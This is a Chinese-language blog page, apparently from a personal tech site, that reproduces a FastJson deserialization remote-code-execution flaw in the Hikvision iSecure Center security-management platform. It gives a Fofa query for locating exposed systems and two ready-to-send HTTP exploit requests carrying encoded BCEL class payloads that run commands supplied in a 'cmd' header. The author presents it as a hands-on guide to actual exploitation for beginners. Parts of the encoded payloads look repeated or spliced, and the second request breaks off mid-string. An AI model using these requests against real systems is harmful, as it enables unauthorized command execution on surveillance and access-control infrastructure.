@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="max-image-preview:large">
+<title>海康威视综合安防管理平台 多处 FastJson反序列化RCE漏洞复现 - 郭智满的部落！</title>
+<meta name="description" content="Ⅰ、漏洞描述海康威视综合安防管理平台是一套“集成化”、“智能化”的平台,通过接入 视频监控Q一卡通、停车场、报警检测等系统的设备。海康威视集成化综合管理软件平台,可以对接入的视频监控点集中管理,实现统一部署、统一配置、统...">
+<link rel="dns-prefetch" href="//at.alicdn.com">
+<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.6" type="text/css" media="all">
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="cxm2-bootstrap-css" href="/wp-content/themes/meteor/assets/css/bootstrap.min.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="cxm2-swiper-css" href="/wp-content/themes/meteor/assets/css/swiper-bundle.min.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="cxm2-icons-css" href="//at.alicdn.com/t/c/font_1989294_lbwlt58uzfn.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="cxm2-main-css" href="/wp-content/themes/meteor/style.css?ver=1.2" type="text/css" media="all">
+<style id="cxm2-main-inline-css" type="text/css">:root, [data-bs-theme=light]{ --bs-link-hover-color:#fe4f70; --cbg-color:#fe5872; --cbg-gradient:var(--cx-gradient-rad); } [data-bs-theme=dark] { --bs-link-hover-color: #fe4f70; }</style>
+<link rel="canonical" href="/archives/392">
+</head>
+
+<body class="post-template-default single single-post postid-392 single-format-standard cxtheme-body cxtheme-width-theme" x-data="MeteorData" :data-bs-theme="darkMode ? 'dark' : ''" :class="{'dark': darkMode,'overflow-y-hidden':popBgshow || searchPopup}">
+    <div class="site-wrapper">
+        <header class="header-s1" :class="{'onfixed' : searchPopup}">
+            <div class="headnav">
+                <div class="container-xl h-container">
+                    <div class="cxlogo">
+                                                <a href="/">
+                            <img src="http://www.guozhiman.top/wp-content/uploads/2024/07/202406201718847016352278-1.png" alt="郭智满的部落！" class="c-light" width="120" height="60">
+                            <img src="http://www.guozhiman.top/wp-content/uploads/2024/07/202406201718847016352278-2.png" alt="郭智满的部落！" class="c-dark" width="120" height="60">
+                        </a>
+                    </div>
+                    <nav class="head-menu d-lg-flex">
+                        <ul id="menu-main-menu" class="navbar-nav">
+                        <li class="menu-item"><a href="/archives/category/meirifenxiang">每日分享</a></li>
+<li class="menu-item"><a href="/archives/category/qianduan">前端</a></li>
+<li class="menu-item"><a href="/archives/category/kaiyuan">开源</a></li>
+<li class="menu-item"><a href="/archives/category/docker">Docker</a></li>
+<li class="menu-item"><a href="/archives/category/%e6%8a%80%e6%9c%af%e6%96%87%e7%ab%a0">技术文章</a></li>
+<li class="menu-item current-post-ancestor current-menu-parent"><a href="/archives/category/wangluoanquan">网络安全</a></li>
+<li class="menu-item menu-has-children">
+<a href="/archives/category/caozuoxitong">操作系统 <i class="cxicon cxicon-chevron-down menu-children-icon"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item"><a href="/archives/category/caozuoxitong/windows">Win系统</a></li>
+	<li class="menu-item"><a href="/archives/category/caozuoxitong/linuxunix">Linux/Unix</a></li>
+	<li class="menu-item"><a href="/archives/category/caozuoxitong/guochanxitong">国产系统</a></li>
+</ul>
+</li>
+                        </ul>
+                    </nav>
+                    <div class="header-r">
+                        <ul class="h-btnbox sm-cnone">
+                            <li class="list-inline-item">
+                                <a href="/archives/392">
+                                    <i class="cxicon cxicon-ranking"></i>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="javascript:;" @click="darkMode = !darkMode;localStorage.setItem('darkMode', darkMode);">
+                                    <i class="cxicon cxicon-sunlight" :class="{'d-none':darkMode}"></i>
+                                    <i class="cxicon cxicon-moon" :class="{'d-none':!darkMode}"></i>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="h-buttons">
+                            <button type="button" class="search btn-default icon-button" @click="searchPopup = !searchPopup" title="Search Btn">
+                                <i class="cxicon cxicon-search font-inherit" :class=" searchPopup ? 'cxicon-error' : 'cxicon-search'"></i>
+                            </button>
+                            <!-- 移动端菜单 -->
+                            <button type="button" class="search btn-default icon-button" @click="moibleMenu = popBgshow = true" title="Menu Btn">
+                                <i class="cxicon cxicon-menu3 font-inherit"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>            
+        </header><!-- header.end-->
+        <!-- Moible Nav -->
+        <div class="mobile-navbox trans_2ms" :class="{'visible': moibleMenu}">
+            <button type="button" class="btn-close" aria-label="关闭" @click="popBgshow = moibleMenu = false"></button>
+            <div class="m-menulogo p-4 pt-3"></div>
+            <div class="m-navbox p-4 pt-0">
+                <ul id="moible-menu" class="m-nav pe-4">
+                <li class="menu-item"><a href="/archives/category/meirifenxiang">每日分享</a></li>
+<li class="menu-item"><a href="/archives/category/qianduan">前端</a></li>
+<li class="menu-item"><a href="/archives/category/kaiyuan">开源</a></li>
+<li class="menu-item"><a href="/archives/category/docker">Docker</a></li>
+<li class="menu-item"><a href="/archives/category/%e6%8a%80%e6%9c%af%e6%96%87%e7%ab%a0">技术文章</a></li>
+<li class="menu-item current-post-ancestor current-menu-parent"><a href="/archives/category/wangluoanquan">网络安全</a></li>
+<li class="menu-item menu-has-children">
+<a href="/archives/category/caozuoxitong">操作系统 <i class="cxicon cxicon-chevron-down menu-children-icon"></i></a>
+<ul class="sub-menu">
+	<li class="menu-item"><a href="/archives/category/caozuoxitong/windows">Win系统</a></li>
+	<li class="menu-item"><a href="/archives/category/caozuoxitong/linuxunix">Linux/Unix</a></li>
+	<li class="menu-item"><a href="/archives/category/caozuoxitong/guochanxitong">国产系统</a></li>
+</ul>
+</li>
+                </ul>
+            </div>
+        </div>
+        <!-- MN.end -->
+        
+
+        <main class="main-container" role="main">
+<div class="banner trem-banner mb-4">
+    <div class="container-xl">
+        
+            <nav class="breadcrumbs" aria-label="面包屑导航">
+                <ol class="breadcrumb flex-nowrap">
+                
+        <li class="item-home flex-shrink-0">
+            <a href="/" title="郭智满的部落！">
+                <span>首页</span>
+            </a>
+        </li>
+
+        <li class="item-category flex-shrink-0">
+            <a href="/archives/category/wangluoanquan" title="网络安全">
+                <span>网络安全</span>
+            </a>
+        </li>
+
+        <li class="item-current line-one pe-4">
+            <a href="/archives/392" title="海康威视综合安防管理平台 多处 FastJson反序列化RCE漏洞复现">
+                <span>海康威视综合安防管理平台 多处 FastJson反序列化RCE漏洞复现</span>
+            </a>
+        </li>
+                </ol>
+            </nav>
+                </div>
+</div>
+<!-- 3 -->
+<section class="wi widget-coltow">
+    <div class="container-xl">
+        <div class="row cxrow">
+            <div class="col-left">
+                <div class="rowleft">
+                    <div class="main-content pe-xl-4">
+                        <article id="post-43" class="post is-single post-content status-publish" x-data="cxm2_Postmeta">
+    <!-- 文章标题 -->
+    <header class="post-header">
+        <h1 class="post-title mt-3 mb-4 fs-2">海康威视综合安防管理平台 多处 FastJson反序列化RCE漏洞复现</h1>        <!-- 文章元信息（如作者、发布时间、分类、标签等） -->
+        <div class="article-meta">
+<ul class="meta-itembox">
+<li class="list-inline-item"><a class="author me-0" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=30&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=60&#038;d=mm&#038;r=g 2x" class="avatar avatar-30 photo" height="30" width="30" decoding="async"></figure>guozhiman</a></li>
+<li class="list-inline-item"><a href="/archives/category/wangluoanquan" rel="category tag">网络安全</a></li>
+<li class="list-inline-item">2024年7月22日</li>
+</ul>
+</div>    </header>
+
+    <!-- 文章正文 -->
+    <div class="article-body mb-4">
+        
+<p>Ⅰ、漏洞描述海康威视综合安防管理平台是一套“集成化”、“智能化”的平台,通过接入 视频监控Q一卡通、停车场、报警检测等系统的设备。海康威视集成化综合管理软件平台,可以对接入的视频监控点集中管理,实现统一部署、统一配置、统一管理和统一调度。PS：我知道很多人只是看到很多文章说如何如何复现，但是具体如何利用，没人说，完全不考虑小白的感受，小龙不会，我，小龙虾，绝对给义父们整明白的。</p>
+
+
+
+<p><strong></strong>Ⅱ、空间搜索<strong>语句</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>Fofa：app="HIKVISlON-iSecure-Center"</code></pre>
+
+
+
+<figure class="wp-block-image"><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-470" src="/wp-content/uploads/2024/07/640-74.png" width="954" height="450" alt="640-74" title="640-74"></figure>
+
+
+
+<p><strong></strong>Ⅲ、漏洞复现</p>
+
+
+
+<p><strong>EXP1</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+</ul>
+
+
+
+<pre class="wp-block-preformatted"><code>POST /bic/ssoService/v1/keepAlive HTTP/1.1</code><code>Host: your-ip</code><code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</code><code>Content-Type: application/json</code><code>cmd: dir</code><code> </code><code>{"CTGT":{&nbsp;"a":&nbsp;{"@type":&nbsp;"java.lang.Class","val":&nbsp;"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b":&nbsp;{"@type":&nbsp;"java.lang.Class","val":&nbsp;"com.sun.org.apache.bcel.internal.util.ClassLoader"},"c":&nbsp;{"@type":&nbsp;"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":&nbsp;{"@type":&nbsp;"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":&nbsp;"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}}</code></pre>
+
+
+
+<figure class="wp-block-image"><img decoding="async" class="alignnone size-full wp-image-471" src="/wp-content/uploads/2024/07/640-75.png" width="953" height="351" alt="640-75" title="640-75"></figure>
+
+
+
+<p><strong>EXP2</strong><strong></strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+</ul>
+
+
+
+<pre class="wp-block-preformatted"><code>POST /bic/ssoService/v1/applyCT HTTP/1.1</code><code>Host: your-ip</code><code>User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36</code><code>Content-Type: application/json</code><code>cmd: whoami</code><code> </code><code>{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$